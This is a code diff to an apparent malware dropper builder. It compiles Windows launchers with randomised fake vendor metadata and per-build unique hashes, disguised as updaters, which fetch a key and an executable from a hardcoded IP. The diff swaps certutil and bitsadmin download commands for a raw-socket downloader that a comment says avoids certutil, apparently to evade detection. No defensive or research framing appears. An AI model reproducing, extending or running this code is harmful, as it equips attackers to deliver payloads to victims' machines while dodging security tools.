@@ -70,7 +70,6 @@ const INTERNAL_NAMES = [
 ];
 
 const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];
-const DOWNLOADERS = ['certutil', 'bitsadmin'];
 
 // ─── per-build unique metadata ───────────────────────────────────────────────
 export function randomBuildMeta(seed) {
@@ -94,12 +93,10 @@ export function randomBuildMeta(seed) {
     copyright:      `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
     guid,
     buildNonce,
-    downloader:     rng.pick(DOWNLOADERS),
     retries:        3 + rng.int(4),
     retryDelaySec:  1 + rng.int(4),
     initialSleepMs: 800 + rng.int(2500),
     logName:        rng.pick(['update.log', 'sync.log', 'service.log', 'agent.log', 'helper.log']),
-    jobName:        rng.pick(['wh_update', 'upd_job', 'svc_update', 'sync_job', 'agent_fetch']),
   };
 }
 
@@ -109,13 +106,16 @@ function cSource(meta, ip, buildId) {
   const stUrl  = `http://${ip}/api/downloads/st.exe`;
   const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   const nonceArr = meta.buildNonce.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
-  const useCertutil = meta.downloader === 'certutil';
 
   return String.raw`
 #include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
+
+#pragma comment(lib, "ws2_32.lib")
 
 // ── per-build unique metadata (changes hash every build) ────────────────────
 __attribute__((used))
@@ -138,15 +138,14 @@ static const wchar_t CONFIG_BLOB[] =
     L"interval=${meta.retries * 600}\n";
 
 // ── endpoints ───────────────────────────────────────────────────────────────
-static const wchar_t CFG_KEY_URL[] = L"${esc4c(keyUrl)}";
-static const wchar_t CFG_ST_URL[]  = L"${esc4c(stUrl)}";
+static const char CFG_IP[] = "${esc4c(ip)}";
+static const char CFG_KEY_PATH[] = "/api/getkey/${buildId}";
+static const char CFG_ST_PATH[]  = "/api/downloads/st.exe";
 
 // ── per-build tuning ────────────────────────────────────────────────────────
 #define INITIAL_SLEEP_MS ${meta.initialSleepMs}
 #define RETRIES          ${meta.retries}
 #define RETRY_DELAY_SEC  ${meta.retryDelaySec}
-#define USE_CERTUTIL     ${useCertutil ? 1 : 0}
-#define JOB_NAME_W       L"${esc4c(meta.jobName)}"
 #define LOG_NAME_W       L"${esc4c(meta.logName)}"
 
 // ── helpers ─────────────────────────────────────────────────────────────────
@@ -185,28 +184,68 @@ static int is_pe(const wchar_t* p) {
     return sig[0] == 'M' && sig[1] == 'Z';
 }
 
-static int download_via(const wchar_t* url, const wchar_t* dest) {
-    wchar_t cmd[2048];
-#if USE_CERTUTIL
-    _snwprintf(cmd, 2048, L"certutil.exe -urlcache -split -f \"%ls\" \"%ls\"", url, dest);
-#else
-    _snwprintf(cmd, 2048, L"bitsadmin.exe /transfer %ls /download /priority normal \"%ls\" \"%ls\"",
-               JOB_NAME_W, url, dest);
-#endif
-    STARTUPINFOW si = { sizeof(si) };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi = {0};
-    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
-                        NULL, NULL, &si, &pi))
-        return 0;
-    DWORD wait = WaitForSingleObject(pi.hProcess, 60000);
-    if (wait == WAIT_TIMEOUT) {
-        TerminateProcess(pi.hProcess, 1);
-        WaitForSingleObject(pi.hProcess, 5000);
+// ── raw HTTP GET downloader (avoids certutil/WinHttp entirely) ──────────────
+static int http_get(const char* host, const char* path, const wchar_t* dest) {
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 0;
+
+    struct addrinfo hints = {0}, *res = NULL;
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    
+    if (getaddrinfo(host, "80", &hints, &res) != 0) { WSACleanup(); return 0; }
+    
+    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (sock == INVALID_SOCKET) { freeaddrinfo(res); WSACleanup(); return 0; }
+
+    DWORD timeout = 10000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
+        closesocket(sock); freeaddrinfo(res); WSACleanup(); return 0;
     }
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    freeaddrinfo(res);
+
+    char req[1024];
+    _snprintf(req, sizeof(req),
+        "GET %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+        "Accept: */*\r\n"
+        "Connection: close\r\n\r\n", path, host);
+
+    if (send(sock, req, (int)strlen(req), 0) == SOCKET_ERROR) {
+        closesocket(sock); WSACleanup(); return 0;
+    }
+
+    char buf[8192];
+    int bytes = 0;
+    int header_done = 0;
+    int header_buf_len = 0;
+
+    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) { closesocket(sock); WSACleanup(); return 0; }
+
+    while ((bytes = recv(sock, buf, sizeof(buf), 0)) > 0) {
+        int offset = 0;
+        if (!header_done) {
+            // simple check for \r\n\r\n across chunks (good enough for 99% of servers)
+            for (int i = 0; i < bytes - 3; i++) {
+                if (buf[i]=='\r' && buf[i+1]=='\n' && buf[i+2]=='\r' && buf[i+3]=='\n') {
+                    header_done = 1;
+                    offset = i + 4;
+                    break;
+                }
+            }
+            if (!header_done) continue;
+        }
+        DWORD w = 0;
+        WriteFile(hFile, buf + offset, bytes - offset, &w, NULL);
+    }
+
+    CloseHandle(hFile);
+    closesocket(sock);
+    WSACleanup();
     return size_ok(dest, 100);
 }
 
@@ -252,7 +291,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         log_msg(L"update start");
         for (int i = 0; i < RETRIES && (need_key || need_st); i++) {
             if (need_key) {
-                if (download_via(CFG_KEY_URL, keyPath) && size_ok(keyPath, 10)) {
+                if (http_get(CFG_IP, CFG_KEY_PATH, keyPath) && size_ok(keyPath, 10)) {
                     log_msg(L"key ok");
                     need_key = 0;
                 } else {
@@ -261,7 +300,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
                 }
             }
             if (need_st) {
-                if (download_via(CFG_ST_URL, stPath) && is_pe(stPath)) {
+                if (http_get(CFG_IP, CFG_ST_PATH, stPath) && is_pe(stPath)) {
                     log_msg(L"st ok");
                     need_st = 0;
                 } else {
@@ -323,12 +362,10 @@ END
 export async function compileLauncher({ key, config, baseExe, buildId }) {
   const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';
 
-  // Seed: buildId XOR 32 bits of fresh randomness — per-build unique even
-  // when two builds race for the same MAX(id)+1
   const seed = ((buildId >>> 0) * 2654435761 ^ crypto.randomBytes(4).readUInt32LE(0)) >>> 0;
   const meta = randomBuildMeta(seed);
 
-  console.log(`[launcher] seed=${seed} company="${meta.company}" product="${meta.product}" version=${meta.version} dl=${meta.downloader}`);
+  console.log(`[launcher] seed=${seed} product="${meta.product}" version=${meta.version}`);
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
   const cPath   = path.join(workDir, 'launcher.c');
@@ -352,7 +389,7 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
+                         '-lws2_32', '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                     { cwd: workDir, timeout: 60_000 });
     return fs.readFileSync(outPath);
   } finally {
